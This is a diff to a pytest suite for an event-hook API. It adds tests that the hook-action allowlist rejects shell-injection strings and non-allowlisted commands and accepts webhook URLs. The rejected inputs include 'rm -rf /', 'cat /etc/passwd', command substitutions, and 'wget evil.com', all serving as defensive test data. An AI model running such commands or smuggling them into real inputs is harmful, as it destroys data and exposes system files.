@@ -60,11 +60,15 @@ async def test_add_hook(client, headers):
 
 @pytest.mark.asyncio
 async def test_add_hook_duplicate(client, headers):
-    event_handler.add_hook("dup", "session-up", "cmd")
+    event_handler.add_hook("dup", "session-up", "https://example.com/dup")
     resp = await client.post(
         "/api/v1/events/hooks",
         headers=headers,
-        json={"name": "dup", "event": "session-down", "action": "cmd2"},
+        json={
+            "name": "dup",
+            "event": "session-down",
+            "action": "https://example.com/dup2",
+        },
     )
     assert resp.status_code == 409
 
@@ -74,7 +78,7 @@ async def test_add_hook_invalid_event(client, headers):
     resp = await client.post(
         "/api/v1/events/hooks",
         headers=headers,
-        json={"name": "bad", "event": "bogus", "action": "cmd"},
+        json={"name": "bad", "event": "bogus", "action": "https://example.com/hook"},
     )
     assert resp.status_code == 409
 
@@ -168,3 +172,81 @@ async def test_clear_history(client, headers):
 async def test_clear_history_empty(client, headers):
     resp = await client.delete("/api/v1/events/history", headers=headers)
     assert resp.status_code == 204
+
+
+# ---------------------------------------------------------------------------
+# Action allowlist validation (QA-160726 / DAWOS-02)
+# ---------------------------------------------------------------------------
+
+
+@pytest.mark.asyncio
+async def test_add_hook_rejects_shell_metachar(client, headers):
+    """Actions with shell metacharacters must be rejected (422)."""
+    for evil in [
+        "accel-cmd show stat; rm -rf /",
+        "accel-cmd show stat | cat /etc/passwd",
+        "accel-cmd show stat && echo pwned",
+        "accel-cmd show stat `whoami`",
+        "accel-cmd show stat $(id)",
+    ]:
+        resp = await client.post(
+            "/api/v1/events/hooks",
+            headers=headers,
+            json={"name": "evil", "event": "session-up", "action": evil},
+        )
+        assert resp.status_code == 422, f"Expected 422 for: {evil}"
+
+
+@pytest.mark.asyncio
+async def test_add_hook_rejects_non_allowlisted_command(client, headers):
+    """Non-allowlisted shell commands must be rejected (422)."""
+    for cmd in ["echo hello", "rm -rf /", "wget evil.com", "/bin/sh -c bad"]:
+        resp = await client.post(
+            "/api/v1/events/hooks",
+            headers=headers,
+            json={"name": "bad", "event": "session-up", "action": cmd},
+        )
+        assert resp.status_code == 422, f"Expected 422 for: {cmd}"
+
+
+@pytest.mark.asyncio
+async def test_add_hook_accepts_webhook_urls(client, headers):
+    """Webhook URLs (http/https) must always be accepted."""
+    urls = [
+        "https://example.com/hook",
+        "http://192.168.1.10:8080/callback",
+        "https://hooks.slack.com/services/T00/B00/xxx",
+    ]
+    for i, url in enumerate(urls):
+        resp = await client.post(
+            "/api/v1/events/hooks",
+            headers=headers,
+            json={
+                "name": f"wh-{i}",
+                "event": "session-up",
+                "action": url,
+            },
+        )
+        assert resp.status_code == 201, f"Expected 201 for: {url}"
+
+
+@pytest.mark.asyncio
+async def test_add_hook_accepts_allowlisted_commands(client, headers):
+    """Allowlisted command prefixes must be accepted."""
+    safe = [
+        "accel-cmd show stat",
+        "uptime",
+        "nft list ruleset",
+        "ss -tunlp",
+    ]
+    for i, cmd in enumerate(safe):
+        resp = await client.post(
+            "/api/v1/events/hooks",
+            headers=headers,
+            json={
+                "name": f"safe-{i}",
+                "event": "session-down",
+                "action": cmd,
+            },
+        )
+        assert resp.status_code == 201, f"Expected 201 for: {cmd}"
